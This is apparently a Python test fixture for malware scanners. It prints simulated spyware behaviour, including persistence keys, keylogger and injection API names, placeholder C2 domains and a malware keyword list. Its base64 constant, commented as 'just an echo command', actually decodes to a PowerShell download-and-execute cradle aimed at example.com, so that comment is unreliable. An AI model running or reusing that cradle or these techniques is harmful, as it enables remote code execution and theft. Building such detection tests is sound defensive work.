#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Test Spyware File

This is a harmless test file that has the characteristics of spyware
to test our detection system. It doesn't actually do anything malicious.
DO NOT USE THIS CODE FOR MALICIOUS PURPOSES.
"""

import os
import sys
import time
import base64
import subprocess
import socket
import requests
import threading

# Various suspicious-looking strings and keywords
KEYWORDS = [
    "keylogger", "backdoor", "rootkit", "trojan",
    "steal passwords", "collect user data", "remote access",
    "persistence", "bypass firewall", "disable antivirus"
]

# Base64 encoded command (just an echo command)
ENCODED_COMMAND = "cG93ZXJzaGVsbCAtZW5jb2RlZGNvbW1hbmQgSQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwB3AHcAdwAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAnACkA"

def fake_persistence():
    """Simulate persistence mechanisms."""
    registry_keys = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        r"SYSTEM\CurrentControlSet\Services"
    ]
    
    print(f"Would add to registry: {registry_keys[0]}")
    # No actual registry modification happens

def fake_keylogger():
    """Simulate keylogger functionality."""
    print("Starting keylogger simulation...")
    print("Would call: GetAsyncKeyState, SetWindowsHookEx")
    # No actual keyboard monitoring happens

def fake_data_exfiltration():
    """Simulate data theft and exfiltration."""
    sensitive_files = [
        "passwords.txt",
        "creditcards.csv",
        "contacts.db",
        "browser_history.sqlite"
    ]
    
    print(f"Would steal these files: {', '.join(sensitive_files)}")
    
    # Fake C2 domains
    command_servers = [
        "evil-server.ddns.net",
        "data-collect.hopto.org",
        "exfil-point.onion"
    ]
    
    print(f"Would connect to: {command_servers[0]}")
    # No actual connection happens

def fake_process_injection():
    """Simulate process injection techniques."""
    api_calls = [
        "VirtualAllocEx", 
        "WriteProcessMemory", 
        "CreateRemoteThread",
        "NtCreateThreadEx"
    ]
    
    target_processes = ["explorer.exe", "svchost.exe", "lsass.exe"]
    print(f"Would inject into {target_processes[0]} using {api_calls[0]}")
    # No actual injection happens

def fake_network_communication():
    """Simulate suspicious network behavior."""
    try:
        # This just creates a socket but doesn't send anything malicious
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.close()
        print("Would connect to C2 server")
    except:
        pass
    
    # Simulate HTTP request patterns (doesn't actually send anything)
    print("Would send data to remote server using HTTP POST")

def fake_anti_analysis():
    """Simulate anti-analysis techniques."""
    vm_checks = [
        "Checking for VMware",
        "Checking for VirtualBox",
        "Checking for debugger",
        "Measuring timing differences",
        "Looking for analysis tools"
    ]
    
    for check in vm_checks:
        print(f"Would perform: {check}")
    
    # Encoded suspicious string (just says "This is a test")
    encoded = "VGhpcyBpcyBhIHRlc3Q="
    decoded = base64.b64decode(encoded).decode('utf-8')
    print(f"Decoded: {decoded}")

def main():
    """Main function - doesn't actually do anything harmful."""
    print("THIS IS A TEST FILE - No malicious actions will be performed")
    print("This file is designed to trigger security scanners for testing purposes")
    
    # Print suspicious strings to ensure detection
    for keyword in KEYWORDS:
        print(f"Test keyword: {keyword}")
    
    # Simulate malicious-looking behavior
    fake_persistence()
    fake_keylogger()
    fake_data_exfiltration()
    fake_process_injection()
    fake_network_communication()
    fake_anti_analysis()
    
    print("\nTest complete. If your scanner detected this file, it's working correctly!")

if __name__ == "__main__":
    main() 